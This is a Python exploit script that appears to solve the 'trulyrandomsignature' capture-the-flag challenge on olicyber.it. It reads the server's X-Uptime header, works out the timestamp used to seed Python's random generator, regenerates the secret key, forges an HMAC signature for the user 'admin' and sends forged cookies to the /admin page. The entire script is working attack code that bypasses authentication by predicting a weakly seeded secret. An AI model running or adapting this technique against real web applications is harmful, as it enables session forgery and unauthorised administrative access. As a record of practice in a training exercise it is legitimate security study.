#!/usr/bin/env python3.8

import requests

import hashlib
from datetime import datetime
import random
import string
import hmac

urlAdmin = "http://trulyrandomsignature.challs.olicyber.it/admin"
urlTempo = "http://trulyrandomsignature.challs.olicyber.it/"

def get_random_string(length):
  letters = string.ascii_lowercase
  result_str = ''.join(random.choice(letters) for i in range(length))
  return result_str

#xuptime = str(int(time.time()-uptime)) => uptime = time.time() - xuptime
def recreatePassword (xuptime, currentTime): 
    uptime = int(currentTime - xuptime )
    fakeSeed = datetime.fromtimestamp(uptime).strftime('%Y-%m-%d %H:%M:%S')
    print(f"fakeSeed: {fakeSeed}")
    random.seed(fakeSeed)
    SUPER_SECRET_KEY = get_random_string(32)
    return SUPER_SECRET_KEY

def sign(text, key):
  textAsBytes = bytes(text, encoding='ascii')
  keyAsBytes  = bytes(key, encoding='ascii')
  signature = hmac.new(keyAsBytes, textAsBytes, hashlib.sha256)
  return signature.hexdigest()

#currentTime = int(time.time())
currentTime = int(datetime.utcnow().timestamp())

r = requests.get(urlTempo)
uptime = int(r.headers["X-Uptime"])
print(f"uptime: {uptime}")
SUPER_SECRET_KEY = recreatePassword(uptime, currentTime)
print(f"SUPER_SECRET_KEY: {SUPER_SECRET_KEY}")

expected_signature = sign('admin', SUPER_SECRET_KEY)
print(f"expected_signature: {expected_signature}")

cookie = {
    "user": "admin", 
    "signature" : expected_signature
}


r = requests.get(urlAdmin, cookies=cookie)
print(r.text)